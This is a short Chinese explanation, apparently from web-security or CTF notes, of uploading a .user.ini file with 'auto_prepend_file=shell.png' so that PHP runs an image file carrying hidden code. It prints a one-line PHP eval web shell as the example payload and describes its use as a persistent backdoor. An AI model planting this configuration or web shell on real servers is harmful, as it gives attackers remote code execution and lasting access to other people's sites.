在上传.user.ini时候上传内容为auto_prepend_file=shell.png
**含义：**  
`auto_prepend_file` 用于指定一个文件，该文件会在每个 PHP 脚本执行之前自动被包含（类似 `require`）。这里设置为 `shell.png`，意味着每个 PHP 脚本运行时，都会先尝试加载 `shell.png` 这个文件。

**为什么是图片文件？**  
虽然扩展名是 `.png`，但文件内容可能实际包含 PHP 代码（例如 `<?php eval($_POST['cmd']); ?>`）。由于 PHP 解释器不关心文件扩展名，只要内容中有 `<?php ... ?>` 标签，就会当作 PHP 代码执行。攻击者常将恶意代码隐藏在图片中（图片马），然后通过修改配置让该图片被自动包含，从而实现 **无文件 WebShell** 或持久化后门。